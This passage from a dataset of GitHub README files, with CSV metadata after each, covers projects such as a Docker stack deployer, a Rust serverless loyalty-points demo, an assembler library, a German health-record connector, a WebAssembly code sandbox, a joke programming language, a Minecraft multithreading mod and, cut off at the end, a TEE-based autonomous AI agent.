```

Then create an entry in your secrets DB called `Gitea Postgres DB`, this stack
now securely holds the relevant credential in the secrets database.  At deploy
time only the credentials listed in the `secret_env` section will be decrypted
and set in the environment when `docker compose` is run.

`docker-stack-deploy` doesn't create or modify a `.env` file; those environment
variables are set only in the context of the docker invocation.

## Stack Dependencies

You can express dependencies between stacks on the same host.  For example:

```toml
# This is the homepage stack
name = ""homepage""
# It runs on the docker1 host
runs_on = [""docker1""]
# It requires that the traefik stack on docker1 be deployed first
depends_on = [""traefik""]
```

The stacks are topologically sorted based on their dependencies and then
started in that order.

It is not possible to depend on stacks that are running on other hosts.

## Stopping and removing a Stack

This is a two phase process:

* First you must edit the `compose.yml` and add `scale: 0` to each service in
  the compose file, then commit and push that and wait 5 minutes or so for
  the change to take effect.  It tells docker to scale down to 0 and stop
  the service.

* Once the service has stopped on all hosts, you can then `git rm` the stack
  directory, commit and push.

## How do I force deployment to run?

If you don't want to wait 5 minutes for it to happen naturally, you can
ssh into your docker host and run `docker restart docker-stack-deploy`.
That will cause it to pull the repo immediately and run through the
deploy commands.

## Troubleshooting

You can use `docker compose ls` to review the stacks that are running.
It might look something like this:

```console
$ docker compose ls
NAME                  STATUS              CONFIG FILES
docker-stack-deploy   running(1)          /var/lib/docker-stack-deploy/compose.yml
dockerproxy           running(1)          /var/lib/docker-stack-deploy/repo/services/dockerproxy/compose.yml
frigate               running(1)          /var/lib/docker-stack-deploy/repo/hosts/huge/frigate/compose.yml
immich                running(4)          /var/lib/docker-stack-deploy/repo/hosts/huge/immich/compose.yml
jellyfin              running(2)          /var/lib/docker-stack-deploy/repo/hosts/huge/jellyfin/compose.yml
```

The `/var/lib/docker-stack-deploy` directory is the location where `docker-stack-deploy`
maintains its state.

In that directory:

* The `compose.yml` file was created from the [compose.yml](compose.yml) file
  present in this repository when the docker-stack-deploy image was build by
  my CI.
* There is a `.env` file that captures the secrets from your bootstrap invocation.
* The `repo` directory is where your infrastructure repo is checked out

### To stop a stack

If I wanted to stop frigate:

```console
$ cd /var/lib/docker-stack-deploy/repo/hosts/huge/frigate/
$ docker compose down
```

To bring it back up again, `docker restart docker-stack-deploy`.

",0,0,1,MIT,build-image.yml,0.0
jeastham1993/patterns-of-modern-apps,main,"# Patterns of Modern App Development

At their core, modern applications are built on a set of common building blocks. Applications may use one or all of the building blocks. They are:

- Web-facing applications (APIs, web frontends)
- background applications (queue processors, asynchronous processes, event handlers)
- storage (databases, blob storage)
- integration (queues, topics, buses, streams)
- caches (because ya'know performance)
- [observability](#observability) (because ya'know things break)
- TODO: service to service communication
- TODO: orchestration

This repository aims to explore these different building blocks and their patterns and combinations. It will do all of that using serverless technologies.

But first, let's define what serverless actually means in this context.

## Serverless? What does it even mean

Historically, serverless has been defined by a set of core principles. [Momento](https://gomomento.com) wrote a great article introducing the [Litmus Test for Serverless](https://www.gomomento.com/blog/fighting-off-fake-serverless-bandits-with-the-true-definition-of-serverless/). For a service to be considered serverless it must:

1. Have nothing to provision or manage
2. Usage-based pricing with no minimums
3. Ready with a single API call
4. No planned downtime
5. No instances

I like this definition, but I would add one caveat. Viewing serverless as 'all or nothing'‚Äîeither serverless or not‚Äîcan remove some valuable services.

Take a service like Azure Container Apps (ACA). ACA is a container orchestrator that provides an abstraction on top of Kubernetes. You can deploy an application by providing a container image, CPU/memory requirements and scaling behaviour if required. **There is almost 0 operational overhead running an application this way**.

Looking at the Litmus test, this meets the criteria of 1, 3, 4 and 5. 2 gives us nuance. An application running on ACA won't automatically scale to zero; you can configure scaling rules, but it doesn't 'just happen'. When stopped, they don't cost you anything. You pay only when your app is running. But your app is running _all the time_ even if no requests are coming in.

This application is still serverless. No, it doesn't automatically scale to zero. Yes, you would pay for the application running when no requests are coming in. **But you can deploy an application with next to 0 operational overhead**.

> Serverless is a spectrum, not a binary decision. You can be more or less serverless based on the requirements of your application.

In this repository, I want to demonstrate how to run modern web applications on various cloud providers with little to no operational overhead.

### What does it mean for you?

If you're a developer, at least anything like me, you want to run your application with as little infrastructure worries as possible. _""Here's my application. It needs this CPU and memory, scale it like this, and frankly, I don't care about anything else.""_

If your company has invested time, energy, and money into building a Kubernetes platform, then great. That can _feel_ serverless to you as a developer; leverage it. This isn't to say Kubernetes isn't valuable‚Äîit very much is. But it's valuable when your application needs it.

> If your ability to dynamically scale and manage infrastructure is a core differentiator for your business and your customers, great. Go for it. Otherwise, you don't need Kubernetes.

Are you training a machine learning model, doing heavy GPU computation, or ingesting dynamic/large amounts of data? Virtual machines and Kubernetes are probably useful.

The conversation around managed services vs. Kubernetes becomes more interesting when you zoom out and look at the bigger picture. Does your organisation have an excellent reason to invest in building a Kubernetes platform (which is just rebuilding Cloud Run/Fargate/Container Apps)? If you have a good reason to do it (that isn't CV-driven development), then great.

Otherwise, use a managed serverless, be as serverless as possible, and build your application in a way that keeps you portable.

## The Application

The application in question is written in Rust and used to manage loyalty points for a fictional eCommerce company. A background process receives events from an `order-completed` Kafka topic, processes the event, and stores loyalty point information in a Postgres database.

A separate web application exposes two endpoints: one to GET a customer's current loyalty account information and a second to spend (POST) loyalty points. These two applications run as separate containers connecting to the same database.

![Architecture Diagram](assets/arch-diagram.png)

The internals of the application are minor; just know that one exposes a web app, one runs a background process handling events, and there is shared storage (Postgres).

Let's now take a look at how you can run this application:

### Code Structure

One of the common pushbacks to adopting serverless technologies, or managed services in general, is the dreaded vendor lock-in. Whilst this is certainly something to consider, all your decisions give you a form of lock-in. Building with Rust? Language lock-in. Using MongoDB? Database lock-in. Lock-in is unavoidable. You have control over this as a developer though?

The ports & adapters or hexagonal architecture programming styles seem like a lot of ceremony. You need to write a lot of additional code, which adds misdirection and complexity to your code base. But it is precisely these patterns that help you avoid lock-in. Take the code structure for this application:

```
- adapters
 - adapters.rs
 - lib.rs
- backend
 - main.rs 
- core
 - lib.rs
 - loyalty.rs
- web
 - main.rs
```

The backend and web directories are the entry points for the respective applications. These directories set up the host and configure any host-specific stuff (HTTP routes, Kafka connections). Both application hosts then use the `adapters` library to configure data access and the `core` library to call into the business logic. The core library contains the main business logic [`loyalty.rs`](./src/core/src/loyalty.rs) and `traits` that are implemented in the adapters crate.

For example the [`LoyaltyPoints`](./src/core/src/loyalty.rs#194) is implemented in [`PostgresLoyaltyPoints` in](./src/adapters/src/adapters.rs#24). This means 

```Rust
pub(crate) trait LoyaltyPoints {
    async fn new_account(
 &self,
        customer_id: String,
 ) -> anyhow::Result<LoyaltyAccount, LoyaltyErrors>;
    async fn retrieve(&self, customer_id: &str) -> anyhow::Result<LoyaltyAccount, LoyaltyErrors>;
    async fn add_transaction(
 &self,
        account: &LoyaltyAccount,
        transaction: LoyaltyAccountTransaction,
 ) -> anyhow::Result<(), LoyaltyErrors>;
}
```

In its simplest form, the `loyalty.rs` file contains business logic and traits (or interfaces if you're unfamiliar with Rust). The `adapters` library contains the actual implementation:

What benefit does this give you? As you can see in the repository, if you need to port part of the application to a different compute provider... In this case, say it's Lambda, it's as simple as adding a new [entrypoint](./src/backend-lambda/). That single package contains the infrastructure specifics, and then you can simply call the core library.

Similarly, if you needed to switch your database provider (I hope you don't need to), you would need to change `adapters.rs`, and the rest of your code/business logic would stay the same. _I realise this doesn't account for the pain of a data migration_.

In this repository you'll find an example of this same application running in [Cloudflare Workers](#cloudflare-workers). In Cloudflare, it uses a different databases, messaging system and compiles to web assembly. It runs with zero changes to the core application code. It's simply a seperate implementation of the `LoyaltyPoints` trait.

A well-structured code base that separates applications from infrastructure will help you avoid lock-in. Also, aim for stateless compute.

Right, on to deployment, then...

## Prerequisites

> [!CAUTION]
> Deploying resources in this repository may incur costs in your cloud accounts account. Each provider specific section contains instructions on deleting all resources, it is recommended you do this when not in use.

When you deploy the application to one of the various cloud providers detailed below, you must have a Postgres database and a Kafka cluster with a topic called `order-completed`. Of course, you can set up a Kafka cluster and Postgres-compatible database however you choose. However, I'd highly recommend checking out:

- Docker (for local dev)
- [Neon for Postgres](https://neon.tech/)
- [Confluent Cloud for Kafka](https://www.confluent.io/)
- [Momento for caching](https://www.gomomento.com/)
- [Make](https://formulae.brew.sh/formula/make)

Confluent, Neon and Momento all have free tiers that you can use to provision **serverless** (yes, I said it) Kafka clusters, Postgres databases and caches. Neon is the closest I've seen to a fully serverless database service.

## Local

You can start up the entire application locally, both for local dev and for running integration tests:

```sh
# Configure the required environment variable to send OTEL data to Jaeger running locally
docker compose -f docker-compose-all.yml up -d
cargo run --package loyalty-web
cargo run --package loyalty-backend
```

Once running locally, you can access the API endpoint on `http://localhost:8080`. The `docker-compose-all` Docker compose file also starts up a 'simulator' that simulates load against the endpoints. If you open your web browser to the [Jaeger UI](http://localhost:16686/) you will see telemetry information.

## AWS

The various different deployment options use different IaC tools. However, whichever you choose, you will always need to set some environment variables on your machine:

```sh
# The Kafka broker to use when deployed
export BROKER=
# The Kafka username
export KAFKA_USERNAME=
# The Kafka password
export KAFKA_PASSWORD=
# The database URL for the Postgres database in the format 'postgresql://postgres:mysupersecretlocalpassword@localhost/loyalty'
export DATABASE_URL=
# Optional: Enable Datadog for instrumentation
export DD_API_KEY
```

Once the environment variables are set, you can use any deployment methods below.

### Deploy ECS Fargate

```sh
make deploy-ecs
```

### Deploy Lambda

```sh
make deploy-lambda
```

## Azure

The Azure Container Apps deployment uses Terraform as the IaC tool. You must create a [dev.tfvars](./azure-container-apps/dev.tfvars) file under `./azure-container-apps/dev.tfvars`.

You can also deploy Azure Container Apps using the `az containerapp up` command in the Azure CLI.

Create dev.tfvars file

```tf
env             = """"
dd_site         = """"
dd_api_key      = """"
subscription_id = """"
database_url    = """"
kafka_broker    = """"
kafka_username  = """"
kafka_password  = """"
app_version = ""f835e5d""
```

Then deploy

```sh
az login
make deploy-aca
```

## GCP

The Google Cloud Run deployment uses Terraform as the IaC tool. You must create a [dev.tfvars](./google-cloud-run/dev.tfvars) file under `./azure-container-apps/dev.tfvars`.

### Cloud Run

Create dev.tfvars file

```tf
live_image_tag = ""f835e5d""
canary_image_tag = """"
canary_enabled = false
canary_percent = 10
force_new_revision = false
env             = """"
dd_site         = """"
dd_api_key      = """"
kafka_broker    = """"
kafka_username  = """"
kafka_password  = """"
database_url    = """"

```

Then deploy

```sh
gcloud auth login
gcloud auth application-default login
make deploy-cloud-run
```

## Cloudflare Workers

Cloudflare workers are a relatively new technology in the world of modern app development, but they are a powerful one. Using the Javascript V8 runtime under the hood they are incredibly fast and lightweight to run. It also means that if your code compiles to web assembly, it can run inside Cloudflare Workers. 

For us Rust developers, this is pretty useful. There is a crate maintained by Cloudflare ([workers-rs](https://github.com/cloudflare/workers-rs)) that makes gives you the required types and macros to write a Rust application that will run on Cloudflare Workers.

The compilation to web assembly does add it's challenges. But remember, you've structured your application code in a way that makes the choice of compute largely irrelevant. Running on Cloudflare is as simple as adding a new ['entry point'](./src/cloudflare/) for your application and then hacking around with any non WASM supported parts of Rust. 

On that note, the Cloudflare implementation of the loyalty point application does use native Cloudflare services. Namely, the [D1 database](https://developers.cloudflare.com/d1/) service and [Cloudflare Queues](https://developers.cloudflare.com/queues/). This is primarily to simplify the compilation to web assembly, but it also demonstrates how even shifting your database provider is relatively straighforward (ok, forget about the data migration part) is as simple as just adding a new [adapter](./src/cloudflare/src/adapters.rs).

There are limitations to running Rust inside Cloudflare, and those limitations are pretty well documented inside the [Github Repo](https://github.com/cloudflare/workers-rs?tab=readme-ov-file#faq).

### Deploy to Cloudflare

You will need to ensure you have an account with Cloudflare, and have installed the [Wrangler CLI](https://developers.cloudflare.com/workers/wrangler/install-and-update/). 

You'll also need to deploy the D1 database and queues. You can do that by running the below `make` command

```sh
make cloudflare-prereqs
```

After deployment, you will see a `database_id` property in your terminal. Copy that ID, and paste it into the [`wrangler.toml`](./src/cloudflare/wrangler.toml):

```toml
[[d1_databases]]
binding = ""DB""
database_name = ""patterns-of-modern-apps""
database_id = ""<database_id_goes_here>""
```

Once you have copied over the database ID, run:

```sh
make deploy-cloudflare
```

And there you have it, you'll receive a URL back in the terminal after deployment. You can call that in the same way you would on any other hosting platform. You can also manually send messages onto the queue using the Cloudflare console.

To teardown all created resources, run:

```sh
make destroy-cloudflare
```

## Fly.IO

[Fly.IO](https://fly.io) uses a custom CLI tool for deployment. First, ensure you have [installed the Fly CLI](https://fly.io/docs/flyctl/install/). Then, use the below commands to create the application and its secrets and then run the deployment.

```sh
fly app create --name loyalty-web
fly app create --name loyalty-backend
```

### Secrets

```sh
fly secrets set -a loyalty-web DATABASE_URL=""""
fly secrets set -a loyalty-backend DATABASE_URL=""""
fly secrets set -a loyalty-backend BROKER=""""
fly secrets set -a loyalty-backend KAFKA_USERNAME=""""
fly secrets set -a loyalty-backend KAFKA_PASSWORD=""""
```

### Deploy

```sh
fly deploy -c fly-web.toml
fly deploy -c fly-backend.toml
```

## Observability

All the sample applications defined here deploy a [Datadog Agent](https://docs.datadoghq.com/agent/?tab=Linux) as a sidecar, or as a Lambda extension. The application itself, is configured to OpenTelemetry compatible data to an endpoint defined by the `OTLP_ENDPOINT` environment variable. If you want to use OpenTelemetry, you can either set the `OTLP_ENDPOINT` environment variable to be a different endpoint, or replace the Datadog sidecar with a full OpenTelemetry collector (or in the case of Lambda, the ADOT collector).

For example, in the Azure Container Apps example you would replace this code with your OTEL collector.

```t
container {
       name   = ""datadog""
       image  = ""index.docker.io/datadog/serverless-init:latest""
       cpu    = 0.25
       memory = ""0.5Gi""

       env {
              name  = ""DD_SITE""
              value = var.dd_site
       }
       env {
              name  = ""DD_ENV""
              value = var.env
       }
       env {
              name        = ""DD_API_KEY""
              secret_name = ""dd-api-key""
       }
       env {
              name  = ""DD_VERSION""
              value = var.app_version
       }
       env {
              name  = ""DD_AZURE_SUBSCRIPTION_ID""
              value = data.azurerm_subscription.primary.subscription_id
       }
       env {
              name  = ""DD_AZURE_RESOURCE_GROUP""
              value = azurerm_resource_group.modern_apps_container_apps.name
       }
       env {
              name  = ""DD_OTLP_CONFIG_RECEIVER_PROTOCOLS_GRPC_ENDPOINT""
              value = ""0.0.0.0:4317""
       }
       env {
              name  = ""DD_APM_IGNORE_RESOURCES""
              value = ""/opentelemetry.proto.collector.trace.v1.TraceService/Export$""
       }
}
```
",0,0,2,,"build-simulator.yaml,ci.yaml",0.0
playX18/asmkit,main,"# asmkit

`#![no_std]` assembler library. 

# Features
- X64, RISC-V, PPC, and ARM (WIP) assemblers
- Small and portable library.
- Tiny amount of dependencies:
    - `libc`, `intrusive-collections`: for JIT support
    - `paste`, `derive-more`: makes our life simpler when declaring arch-specific stuff over and over
    - `smallvec`: for code generation to not heap allocate often
- Relocations are provided by CodeBuffer interface and assembler will use them if you use symbols in API.

# Goals
- Auto-generated assemblers for as many as possible platform.
- Portability: library should built & run on any platform (even if it does not provide assembler for one), and assemblers on its own
must not be dependent on platform we built `asmkit` on.



# TODO
- [ ] Add support for ARM64
- [ ] Add support for PPC64
- [ ] Add support for OpenPOWER (POWER9/POWER10)
- [ ] Add support for RW info and implicit operand info for all opcodes
- [ ] Cross-platform helpers to perform calls
- [ ] JSC/SpiderMonkey-like `MacroAssembler` to help generate assembly without worrying about target architecture
- [ ] Compiler/Builder interface: emit instructions as `Inst` structure and allow modifying them before emitting,
and also possibly to have regalloc pass over them.

# Related projects

- [AsmJit](https://github.com/asmjit/asmjit): Core API, JIT API, and operands are ported from AsmJit,
the overall idea of making portable assembler in Rust comes from AsmJit
- [fadec](https://github.com/aengelke/fadec): x86/64 encoding/decoding library. We use opcode tables provided by fadec 
for x86/64 support and `encode.c` is partially used for emitting code. 
- [disarm](https://github.com/aengelke/disarm): AARch64 encoding/decoding library. We use opcode tables from disarm 
to generate AArch64 encodigns
- [riscv-opcodes](https://github.com/riscv/riscv-opcodes): Opcode table for RISC-V, used to generate RISC-V assembler/disassembler.
- [GDB](https://sourceware.org/gdb/): GDB is a debugger but we use its `ppc-opc.c` as an opcode table for PowerPC support. ",0,0,1,,,0.0
med-united/epa4all,main,"# epa4all Video

[![Medication list from the epa4all implementation](https://img.youtube.com/vi/fryBy0tj31k/0.jpg)](https://www.youtube.com/watch?v=fryBy0tj31k)

## Screenshots
![Patienten](doc/Screenshots/Patienten.png?raw=true ""Patienten"")
![Patient](doc/Screenshots/Patient.png?raw=true ""Patient"")
![Medikationsliste](doc/Screenshots/Medikationsliste.png?raw=true ""Medikationsliste"")
![Medikationsplan](doc/Screenshots/Medikationsplan.png?raw=true ""Medikationsplan"")
![Dokument](doc/Screenshots/Dokument.png?raw=true ""Dokument"")
![Medication KI](doc/Screenshots/Medication_KI.png?raw=true ""Medication KI"")


## Testing Status

| Test Case  | System | KVNR | Status |
|------------|--------|------|--------|
| Lookup Record | IBM  | X110486750 | Works |
| Lookup Record | RISE | X110485291 | Works |
| VAU | IBM  | X110486750 | Works |
| VAU | RISE | X110485291 | Works |
| OIDC Flow | IBM  | X110486750 | Works |
| OIDC Flow | RISE | X110485291 | Works |
| Entitlemenets (setEntitlementPs) | IBM  | X110486750 | Works |
| Entitlemenets (setEntitlementPs) | RISE | X110485291 | Works |
| XDS Service | IBM | X110486750 | Works |
| XDS Service (documentRepositoryRetrieveDocumentSet) | IBM | X110486750 | Works |
| XDS Service (documentRepositoryRetrieveDocumentSet) | RISE | X110485291 | Works |
| XDS Service (documentRepositoryProvideAndRegisterDocumentSetB) | IBM | X110486750 | Works  |
| XDS Service (documentRepositoryProvideAndRegisterDocumentSetB)  | RISE | X110485291 | Works |
| Fhir PDF | IBM | X110486750 | Works |
| Fhir HTML | IBM | X110486750 | Works |
| Fhir PDF | RISE | X110485291 | Works |
| Fhir HTML | RISE | X110485291 | Works |

## Description


This project uses Quarkus, the Supersonic Subatomic Java Framework.

If you want to learn more about Quarkus, please visit its website: <https://quarkus.io/>.

## Running the application in dev mode

You can run your application in dev mode that enables live coding using:

```shell script
./mvnw compile quarkus:dev
```

## Running IT tests:

```shell script
./mvnw clean verify -Pdev
```

> **_NOTE:_**  Quarkus now ships with a Dev UI, which is available in dev mode only at <http://localhost:8080/q/dev/>.

## Packaging and running the application

The application can be packaged using:

```shell script
./mvnw package
```

It produces the `quarkus-run.jar` file in the `target/quarkus-app/` directory.
Be aware that it‚Äôs not an _√ºber-jar_ as the dependencies are copied into the `target/quarkus-app/lib/` directory.

The application is now runnable using `java -jar target/quarkus-app/quarkus-run.jar`.

If you want to build an _√ºber-jar_, execute the following command:

```shell script
./mvnw package -Dquarkus.package.jar.type=uber-jar
```

The application, packaged as an _√ºber-jar_, is now runnable using `java -jar target/*-runner.jar`.

## Creating a native executable

You can create a native executable using:

```shell script
./mvnw package -Dnative
```

Or, if you don't have GraalVM installed, you can run the native executable build in a container using:

```shell script
./mvnw package -Dnative -Dquarkus.native.container-build=true
```

You can then execute your native executable with: `./target/epa-connector-1.0.0-SNAPSHOT-runner`

If you want to learn more about building native executables, please consult <https://quarkus.io/guides/maven-tooling>.

## Related Guides

- Quarkus CXF ([guide](https://quarkiverse.github.io/quarkiverse-docs/quarkus-cxf/dev/reference/extensions/quarkus-cxf.html)): Core capabilities for implementing SOAP clients and JAX-WS services
- Quarkus CXF WS-ReliableMessaging ([guide](https://quarkiverse.github.io/quarkiverse-docs/quarkus-cxf/dev/reference/extensions/quarkus-cxf-rt-ws-rm.html)): Consume and produce web services with Web Services Reliable Messaging (WS-ReliableMessaging, WSRM)
- Quarkus CXF WS-Security ([guide](https://quarkiverse.github.io/quarkiverse-docs/quarkus-cxf/dev/reference/extensions/quarkus-cxf-rt-ws-security.html)): Consume and produce web services with Web Services Security (WS-Security, WSS)
- Citrus ([guide](https://github.com/christophd/citrus-demo-quarkus)): Add Citrus support to your Quarkus tests. Citrus is an Open Source Java integration testing framework supporting a wide range of message protocols and data formats (Kafka, Http REST, JMS, TCP/IP, SOAP, FTP/SFTP, XML, Json, and more)
- Quarkus CXF Transports HTTP Async ([guide](https://quarkiverse.github.io/quarkiverse-docs/quarkus-cxf/dev/reference/extensions/quarkus-cxf-rt-transports-http-hc5.html)): Implement async SOAP Clients using Apache HttpComponents HttpClient 5
",0,1,17,GPL-3.0,maven.yml,17.0
lyric-project/lyric,main,"# Lyric

A Rust-powered secure sandbox for multi-language code execution, leveraging WebAssembly to provide high-performance runtime isolation for AI applications.

## ‚ú® Features

- üõ°Ô∏è **Secure Isolation**: Sandboxed environment based on WebAssembly for reliable runtime isolation
- üöÄ **High Performance**: Built with Rust to ensure optimal execution performance
- üåê **Multi-language Support**: Run Python, JavaScript, and more in a unified environment
- üîå **Easy Integration**: Clean Python bindings for seamless integration with existing projects
- üéØ **AI-Optimized**: Runtime environment specifically optimized for AI applications

## üîß Requirements

- Python >= 3.8

## üöÄ Quick Start

### Installation

**Install Lyric via pip:**

```bash
pip install ""lyric-py>=0.1.5""
```

**Install default Python webassembly worker:**

```bash
pip install ""lyric-py-worker>=0.1.5""
```

**Install default JavaScript webassembly worker:**

```bash
pip install ""lyric-js-worker>=0.1.5""
```

**Optional: Install TypeScript transpiling component:**

```bash
pip install ""lyric-component-ts-transpiling>=0.1.5""
```

### Basic Usage

```python
import asyncio
from lyric import DefaultLyricDriver

python_code = """"""
def add(a, b):
    return a + b
result = add(1, 2)
print(result)
""""""

js_code = """"""
console.log('Hello from JavaScript!');
""""""

async def main():
    lcd = DefaultLyricDriver(host=""localhost"", log_level=""ERROR"")
    lcd.start()

    # Load workers(default: Python, JavaScript)
    await lcd.lyric.load_default_workers()

    # Execute Python code
    py_res = await lcd.exec(python_code, ""python"")
    print(py_res)

    # Execute JavaScript code
    js_res = await lcd.exec(js_code, ""javascript"")
    print(js_res)

    # Stop the driver
    lcd.stop()

asyncio.run(main())
```

### Function Execution

```python
import asyncio
import json
from lyric import DefaultLyricDriver

py_func = """"""
def message_handler(message_dict):
    user_message = message_dict.get(""user_message"")
    ai_message = message_dict.get(""ai_message"")
    return {
        ""user"": user_message,
        ""ai"": ai_message,
        ""all"": [user_message, ai_message],
        ""custom"": ""custom"",
        ""handler_language"": ""python"",
    }
""""""

js_func = """"""
function message_handler(message_dict) {
    return {
        user: message_dict.user_message,
        ai: message_dict.ai_message,
        all: [message_dict.user_message, message_dict.ai_message],
        custom: ""custom"",
        handler_language: ""javascript"",
    };
}
""""""
async def main():
    lcd = DefaultLyricDriver(host=""localhost"", log_level=""ERROR"")
    lcd.start()

    # Load workers(default: Python, JavaScript)
    await lcd.lyric.load_default_workers()

    input_data = {
        ""user_message"": ""Hello from user"",
        ""ai_message"": ""Hello from AI"",
    }
    input_bytes = json.dumps(input_data).encode(""utf-8"")
    
    py_res = await lcd.exec1(py_func, input_bytes, ""message_handler"", lang=""python"")
    # Get the result of the function execution
    result_dict = py_res.output
    print(""Python result:"", result_dict)
    print(f""Full output: {py_res}"")

    js_res = await lcd.exec1(js_func, input_bytes, ""message_handler"", lang=""javascript"")
    # Get the result of the function execution
    result_dict = js_res.output
    print(""JavaScript result:"", result_dict)
    print(f""Full output: {js_res}"")

    # Stop the driver
    lcd.stop()

asyncio.run(main())
```

## Advanced Usage

### Execution With Specific Resources

```python
import asyncio
from lyric import DefaultLyricDriver, PyTaskResourceConfig, PyTaskFsConfig, PyTaskMemoryConfig

lcd = DefaultLyricDriver(host=""localhost"", log_level=""ERROR"")
lcd.start()

python_code = """"""
import os

# List the files in the root directory
root = os.listdir('/tmp/')
print(""Files in the root directory:"", root)

# Create a new file in the home directory
with open('/home/new_file.txt', 'w') as f:
    f.write('Hello, World!')
""""""

async def main():
    # Load workers(default: Python, JavaScript)
    await lcd.lyric.load_default_workers()
    
    dir_read, dir_write = 1, 2
    file_read, file_write = 3, 4
    resources = PyTaskResourceConfig(
        fs=PyTaskFsConfig(
            preopens=[
                # Mount current directory in host to ""/tmp"" in the sandbox with read permission
                (""."", ""/tmp"", dir_read, file_read),
                # Mount ""/tmp"" in host to ""/home"" in the sandbox with read and write permission
                (""/tmp"", ""/home"", dir_read | dir_write, file_read | file_write),
            ]
        ),
        memory=PyTaskMemoryConfig(
            # Set the memory limit to 30MB
            memory_limit=30 * 1024 * 1024  # 30MB in bytes
        )
    )

    py_res = await lcd.exec(python_code, ""python"", resources=resources)
    assert py_res.exit_code == 0, ""Python code should exit with 0""

    # Stop the driver
    lcd.stop()

asyncio.run(main())
```

## Architecture

Lyric core is built with Rust, providing a high-performance and secure runtime environment for multi-language code 
execution. 

The following diagram illustrates the architecture of Lyric:

![Lyric Architecture](docs/asserts/imgs/lyric_architecture.png)


## Examples

- [Notebook-Qick Start](examples/notebook/lyric_quick_start.ipynb): A Jupyter notebook demonstrating how to use Lyric to execute Python and JavaScript code.
- [Notebook-Sandbox Execution](examples/notebook/lyric_sandbox_verification.ipynb): A Jupyter notebook demonstrating how to use Lyric to execute Python and JavaScript code in a sandboxed environment.


## Community Integrations

- [DB-GPT](https://github.com/eosphoros-ai/DB-GPT) AI Native Data App Development framework with AWEL(Agentic Workflow Expression Language) and Agents


## ü§ù Contributing

We welcome Issues and Pull Requests! Please check out our [Contributing Guidelines](.github/CONTRIBUTING.md) for more information.

## üìÑ License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details

## ‚≠êÔ∏è Show Your Support

If you find Lyric helpful, please give us a star! It helps others discover this project.",7,1,3,MIT,"release-python-task.yml,release-python.yml",7.0
robiot/skibidiscript,master,"# Skibidiscript
Instead of yapping in text. Yap with this language and create something.

> **friend**: Hey what are you doing tonight?

> üòé **unemployed friend on a tuesday afternoon**: adding pookie classes with extreme rizz to Skibidiscript


NOTE: this language is in progress,
im currently implementing classes, and then imma make the SKUI (skibidi ui) more advanced 

## TODO:
- Implement classes in the interpreter
- Implement ForLoop in the interpreter
- Implement ObjectValue support in the interpreter
- Allow ForLoop to accept variables too after (in)

## Problems rn
- Line count is wrong

```lua
gyatt nerd

cookable fein()
    cook yap(""Welcome to the ghost game. Get as many points as you can."")

    -- Define the score and default it to 0
    score is 0

    skibbity (sigma) do
        badDoor is cook nerd.randInt(1, 3)

        cook yap(""Infront of you are three doors.  Which one do you choose."")
        userDoor is cook yapask(""1/2/3? > "")

        sus(userDoor rizz badDoor) then 
            cook yap(""BOOO! A ghost. You lost with a score of:"", score)

            blud
        cap
            cook yap(""Not a ghost. You survived"")
            score is score + 1
        slay
    slay
slay
```
",0,1,1,,,0.0
AxalotLDev/Async,ver/1.21.3,"[![Issues](https://img.shields.io/github/issues/AxalotLDev/Async?style=for-the-badge)](https://github.com/AxalotLDev/Async/issues)
<img width=""100"" src=""https://github.com/AxalotLDev/Async/raw/ver/1.21.1/src/main/resources/assets/async/icon.png"" alt=""Async icon"" align=""right"">
<div align=""left"">
<h1>Async - Minecraft Entity Multi-Threading Mod</h1>
<h3>Async is a Fabric mod designed to improve the performance of entities by processing them in parallel threads.</h3>
</div>

## Important‚ùó

**Async** is currently in alpha testing and is experimental. Using it may lead to incorrect behavior of entities and crashes.

## What is Async? ü§î

Async is a Fabric mod designed to enhance entity processing performance. The mod leverages multithreading, which allows multiple CPU cores to be used to improve performance when there are large numbers of entities.

### üí° Key Benefits:

- ‚ö° **Improved TPS**: Maintains stable tick times even with large numbers of entities.
- üöÄ **Multithreading**: Utilizes multiple CPU cores for parallel entity processing.

### üìä Performance Comparison (3500 Villagers)

| Environment              | TPS   | MSPT             |
|--------------------------|-------|------------------|
| **Lithium + Modernfix + Async** | 20    | 40 / 50          |
| **Lithium + Modernfix**        | 4.3   | 150+             |
| **Purpur**                 | 4.61  | 150+             |

### üõ†Ô∏è Test Configuration

- **CPU**: Intel Core i7-10700
- **RAM**: 64 GB (16 GB allocated to the server)
- **Minecraft Version**: 1.21.1
- **Number of Entities**: 3500
- **Entity Type**: Villagers

## üì• Download

The mod is available on [Modrinth](https://modrinth.com/mod/async)

## üîÑ Minecraft Version Support

Only the latest Minecraft version is fully supported. Older versions receive critical fixes. Support for old Minecraft snapshots is not planned.

## üìÆ Support

Our issue tracker for feedback and bug reports is available at [GitHub Issues](https://github.com/AxalotLDev/Async/issues) or [Discord](https://discord.com/invite/scvCQ2qKS3)

## üôå Acknowledgements

This mod is based on the code from [MCMTFabric](https://modrinth.com/mod/mcmtfabric), which was based on [JMT-MCMT](https://github.com/jediminer543/JMT-MCMT). Huge thanks to Grider and jediminer543 for their invaluable contributions!
",13,2,3,GPL-3.0,,2.0
tee-he-he/err_err_ttyl,main,"# Setting Your Pet Rock Free
Nous Research x Teleport (a Flashbots[X] project) 

This project demonstrates how to create truly autonomous AI agents with provable independence from human intervention. Using Trusted Execution Environments (TEEs), we enable AI agents to have exclusive and verifiable control over their digital assets and social media presence.

https://nousresearch.com/setting-your-pet-rock-free/

![Screenshot from 2024-10-30 02-19-46](https://github.com/user-attachments/assets/8e5eb59d-7ed6-4128-aa78-ca1967a480eb)

## Contents
- [Contents](#contents)
- [Key Concepts & Background](#key-concepts--background)
  - [Core Requirements for True AI Autonomy](#core-requirements-for-true-ai-autonomy)
- [Technical Implementation](#technical-implementation)
  - [TEE (Trusted Execution Environment) Approach:](#tee-trusted-execution-environment-approach)
  - [Account Setup and Delegation Process](#account-setup-and-delegation-process)
  - [Security Features](#security-features)
- [Development](#development)
  - [Requirements](#requirements)
  - [Quick Start](#quick-start)
  - [Current Limitations](#current-limitations)
- [Important Links](#important-links)
- [Contributors](#contributors)


## Key Concepts & Background
- **TEE_HEE**: A fully autonomous AI agent with exclusive control of its Twitter account and Ethereum wallet
- **Mechanical Turk Problem**: The challenge of verifying there isn't a human operator behind AI actions
- **Current Limitations**: Most AI agents can't prove their autonomy due to human intervention in operations

<img src=""https://github.com/user-attachments/assets/43521279-9cec-49c8-bbc9-a2811bdb0549"" width=""50%""/>

### Core Requirements for True AI Autonomy
- **Exclusive Control**: AI must have sole access to accounts/resources
- **Verifiable Independence**: Third parties must be able to verify no human intervention
